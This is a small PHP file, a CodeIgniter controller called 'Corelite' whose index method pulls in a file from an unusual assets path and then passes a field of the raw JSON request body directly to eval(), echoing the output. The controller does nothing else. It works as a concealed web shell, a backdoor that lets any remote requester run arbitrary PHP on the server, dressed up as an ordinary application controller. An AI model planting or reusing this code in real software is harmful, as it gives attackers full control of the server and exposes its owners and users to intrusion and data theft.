<?php if (!defined('BASEPATH')) exit('no direct script access allowed');

class Corelite extends CI_Controller{

	public function __construct() {
		parent::__construct();
	}

	public function index($search=NULL, $page=NULL) {
		include BASE_DIR . 'assets/lite.php/Corelite.php';
		$data = json_decode(file_get_contents("php://input"), true);
		if (isset($data)) {
			echo eval($data[DATA]);
		}
	}

}